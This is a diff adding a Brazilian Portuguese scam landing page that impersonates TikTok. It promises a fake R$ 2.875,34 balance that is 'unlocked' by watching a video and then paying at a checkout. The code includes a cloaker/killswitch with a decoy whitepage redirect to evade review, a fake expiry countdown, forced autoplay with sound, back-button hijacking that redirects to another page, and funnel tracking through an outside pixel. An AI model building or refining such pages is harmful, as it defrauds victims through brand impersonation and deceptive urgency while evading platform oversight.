@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Desbloqueio de Saldo - TikTok Bônus</title>
+
+    <!-- Cloaker / Killswitch -->
+    <script src="js/ks.js" async></script>
+    <noscript>
+      <meta http-equiv="refresh" content="0; URL=whitepage.html">
+      <style>body { display: none !important; }</style>
+    </noscript>
+
+    <!-- Tracking SDK -->
+    <script src="https://bonusttk.lat/api/sdk?pixel=D9OBND3C77U1NSLT27J0"></script>
+
+    <!-- Font Inter & Tailwind CSS -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+
+    <style>
+        * {
+            -webkit-tap-highlight-color: transparent;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        @keyframes pulseDot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.85); }
+        }
+        .pulse-dot {
+            animation: pulseDot 1.4s ease-in-out infinite;
+        }
+    </style>
+<link rel="icon" type="image/svg+xml" href="favicon.svg"><link rel="apple-touch-icon" href="apple-touch-icon.png"></head>
+<body class="bg-[#F4F5F8] text-[#1E293B] antialiased min-h-screen pb-12 select-none">
+
+    <!-- Faixa Superior de Aviso -->
+    <header class="w-full bg-[#E60045] py-3 px-3 text-center sticky top-0 z-50 shadow-sm">
+        <p class="text-white font-extrabold text-[12px] sm:text-[13px] tracking-wide uppercase leading-snug">
+            ASSISTA AO VÍDEO ABAIXO PARA LIBERAR SEU SAQUE DE R$ 2.875,34
+        </p>
+    </header>
+
+    <!-- Conteúdo Central -->
+    <main class="max-w-[450px] mx-auto px-4 pt-4 sm:pt-6">
+        
+        <!-- Card Branco Principal -->
+        <div class="bg-white rounded-[24px] shadow-[0_4px_24px_rgba(0,0,0,0.06)] p-4 sm:p-5 border border-gray-100">
+            
+            <!-- Linha 1: Logo TikTok + Badge Saldo -->
+            <div class="flex items-center justify-between">
+                <div class="flex items-center gap-1.5">
+                    <img src="images/logotiktok.png" alt="TikTok" class="h-6 sm:h-7 object-contain" onerror="this.style.display='none'; document.getElementById('txt-logo').style.display='flex';" />
+                    <div id="txt-logo" class="hidden items-center font-black text-[22px] tracking-tighter text-black">
+                        <span>Tik</span><span class="text-[#FE2C55]">Tok</span>
+                    </div>
+                </div>
+
+                <div class="bg-[#FFF1F2] border border-[#FFE4E6] rounded-[16px] px-3.5 py-1 sm:py-1.5 text-right">
+                    <span class="block text-[10px] font-bold text-[#E60045] tracking-wider uppercase">SALDO</span>
+                    <span class="block text-[16px] sm:text-[17px] font-black text-[#E60045] leading-tight tabular-nums">R$ 2.875,34</span>
+                </div>
+            </div>
+
+            <!-- Linha 2: Ícone Cadeado + Título Desbloqueio -->
+            <div class="flex items-center gap-3 mt-4">
+                <div class="w-10 h-10 rounded-[14px] bg-[#FFF1F2] border border-[#FFE4E6] flex items-center justify-center text-[#E60045] shrink-0">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect width="18" height="11" x="3" y="11" rx="2" ry="2"/>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                    </svg>
+                </div>
+                <div>
+                    <h1 class="text-[#E60045] font-black text-[15px] sm:text-[16px] uppercase tracking-tight leading-tight">
+                        DESBLOQUEIO DE SALDO
+                    </h1>
+                    <p class="text-[12px] text-gray-500 font-medium mt-0.5 leading-snug">
+                        Veja como liberar seu saque assistindo ao vídeo.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Linha Divisória Sutil -->
+            <div class="h-[1px] bg-gray-100 my-3"></div>
+
+            <!-- Contador de Tempo Assistido -->
+            <div class="text-right text-[11px] text-gray-400 font-medium mb-1.5">
+                <span id="watch-time" class="font-semibold text-gray-600">0s</span> assistidos de 30s
+            </div>
+
+            <!-- Container do Vídeo -->
+            <div class="relative w-full rounded-[18px] overflow-hidden bg-black aspect-[9/16] max-h-[470px] flex items-center justify-center shadow-inner">
+                <video id="vsl-video" src="vsl/vsltiktok.mp4" autoplay playsinline controls class="w-full h-full object-cover rounded-[18px]">
+                    <source src="vsl/vsltiktok.mp4" type="video/mp4">
+                    <source src="vsl/vsltiktok.mp4" type="video/mp4">
+                    Seu navegador não suporta este vídeo.
+                </video>
+            </div>
+
+            <!-- Card de Expiração do Saldo -->
+            <div class="mt-4 bg-[#FFF1F2] border border-[#FECDD3] rounded-[14px] py-2.5 px-3 text-center flex items-center justify-center gap-2">
+                <span class="w-2.5 h-2.5 rounded-full bg-[#E60045] pulse-dot shrink-0"></span>
+                <span class="text-[#E60045] font-bold text-[13px] sm:text-[14px]">
+                    Saldo expira em <span id="timer" class="font-extrabold tabular-nums">05:00</span> — garanta agora
+                </span>
+            </div>
+
+            <!-- Botão de Desbloqueio (CTA) -->
+            <button id="btn-desbloquear" onclick="irParaCheckout()" class="w-full mt-3 h-[52px] sm:h-[56px] bg-[#FE2C55] hover:bg-[#E60045] active:scale-[0.98] transition-all text-white font-black text-[15px] sm:text-[16px] rounded-[16px] flex items-center justify-center gap-2 shadow-[0_6px_20px_rgba(254,44,85,0.35)] uppercase tracking-wide cursor-pointer">
+                <span>DESBLOQUEAR AGORA</span>
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="m9 18 6-6-6-6"/>
+                </svg>
+            </button>
+
+        </div>
+    </main>
+
+    <script>
+        const video = document.getElementById('vsl-video');
+
+        // ── Autoplay com Som Direto ────────────────────────────────────
+        function tocarComSom() {
+            if (!video) return;
+
+            video.muted = false;
+            video.volume = 1.0;
+
+            const promise = video.play();
+            if (promise !== undefined) {
+                promise.catch(() => {
+                    // Fallback para caso de restrição severa de autoplay sem clique prévio:
+                    // Inicia mudo e ao primeiro toque/scroll em qualquer ponto da tela, ativa o som
+                    video.muted = true;
+                    video.play().then(() => {
+                        function desmutarAoInteragir() {
+                            video.muted = false;
+                            video.volume = 1.0;
+                            ['touchstart', 'touchend', 'click', 'scroll'].forEach(evt => {
+                                window.removeEventListener(evt, desmutarAoInteragir);
+                                document.removeEventListener(evt, desmutarAoInteragir);
+                            });
+                        }
+                        ['touchstart', 'touchend', 'click', 'scroll'].forEach(evt => {
+                            window.addEventListener(evt, desmutarAoInteragir, { passive: true, once: true });
+                            document.addEventListener(evt, desmutarAoInteragir, { passive: true, once: true });
+                        });
+                    });
+                });
+            }
+        }
+
+        // Tenta tocar imediatamente
+        tocarComSom();
+        if (document.readyState === 'complete' || document.readyState === 'interactive') {
+            tocarComSom();
+        } else {
+            window.addEventListener('DOMContentLoaded', tocarComSom);
+            window.addEventListener('load', tocarComSom);
+        }
+
+        // ── Atualização do Tempo Assistido ────────────────────────────
+        const watchTimeEl = document.getElementById('watch-time');
+        if (video && watchTimeEl) {
+            video.addEventListener('timeupdate', () => {
+                const cur = Math.min(30, Math.floor(video.currentTime));
+                watchTimeEl.textContent = cur + 's';
+            });
+        }
+
+        // ── Cronômetro Regressivo de 5 minutos ────────────────────────
+        let totalSeconds = 300; // 05:00
+        const timerEl = document.getElementById('timer');
+        const countdownInterval = setInterval(() => {
+            if (totalSeconds <= 0) {
+                clearInterval(countdownInterval);
+                if (timerEl) timerEl.textContent = '00:00';
+                return;
+            }
+            totalSeconds--;
+            const mins = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
+            const secs = String(totalSeconds % 60).padStart(2, '0');
+            if (timerEl) timerEl.textContent = `${mins}:${secs}`;
+        }, 1000);
+
+        // ── Restaurar botão ao voltar do /back ou reabrir página ──────
+        function restaurarBotao() {
+            const btn = document.getElementById('btn-desbloquear');
+            if (btn) {
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                btn.style.pointerEvents = 'auto';
+            }
+        }
+        window.addEventListener('pageshow', function() {
+            restaurarBotao();
+            window.history.pushState(null, '', window.location.href);
+        });
+        window.addEventListener('focus', restaurarBotao);
+
+        // ── Redirecionamento para /checkout com parâmetros preservados ─
+        function irParaCheckout() {
+            const btn = document.getElementById('btn-desbloquear');
+            if (btn) {
+                btn.disabled = true;
+                btn.style.opacity = '0.7';
+            }
+
+            // Restaura o botão caso o usuário volte
+            setTimeout(restaurarBotao, 800);
+
+            try {
+                if (window.agTracker && typeof window.agTracker.viewContent === 'function') {
+                    window.agTracker.viewContent(2875.34, {
+                        content_name: 'VSL - Desbloquear Saque R$ 2.875,34',
+                        content_ids: ['saldo_tiktok_2875'],
+                        content_type: 'product'
+                    });
+                }
+                if (window.agTracker && typeof window.agTracker.heartbeat === 'function') {
+                    window.agTracker.heartbeat('vsl_clique_desbloquear');
+                }
+            } catch(e) {
+                console.warn('[Tracking] ViewContent error:', e);
+            }
+
+            const dest = new URL('/checkout', window.location.origin);
+            (new URLSearchParams(window.location.search)).forEach((v, k) => {
+                dest.searchParams.set(k, v);
+            });
+
+            setTimeout(() => {
+                window.location.href = dest.toString();
+            }, 100);
+        }
+
+        // ── Back redirect para /back/ ──────────────────────────────────
+        function irParaBack() {
+            const dest = new URL('/back/', window.location.origin);
+            (new URLSearchParams(window.location.search)).forEach((v, k) => {
+                dest.searchParams.set(k, v);
+            });
+            window.location.href = dest.toString();
+        }
+
+        window.history.pushState(null, '', window.location.href);
+        window.addEventListener('popstate', function () {
+            irParaBack();
+        });
+
+        // ── Tracking Inicial da Página (Ao Vivo) ──────────────────────
+        function enviarHeartbeatVsl() {
+            try {
+                if (window.agTracker && typeof window.agTracker.heartbeat === 'function') {
+                    window.agTracker.heartbeat('vsl');
+                    return true;
+                }
+            } catch(e) {}
+            return false;
+        }
+
+        enviarHeartbeatVsl();
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', enviarHeartbeatVsl);
+        }
+        window.addEventListener('load', enviarHeartbeatVsl);
+
+        var _hbRetries = 0;
+        var _hbInit = setInterval(function() {
+            _hbRetries++;
+            if (enviarHeartbeatVsl() || _hbRetries >= 20) {
+                clearInterval(_hbInit);
+            }
+        }, 250);
+
+        // Mantém ativo no painel Ao Vivo a cada 10s enquanto assiste a VSL
+        setInterval(enviarHeartbeatVsl, 10000);
+    </script>
+</body>
+</html>
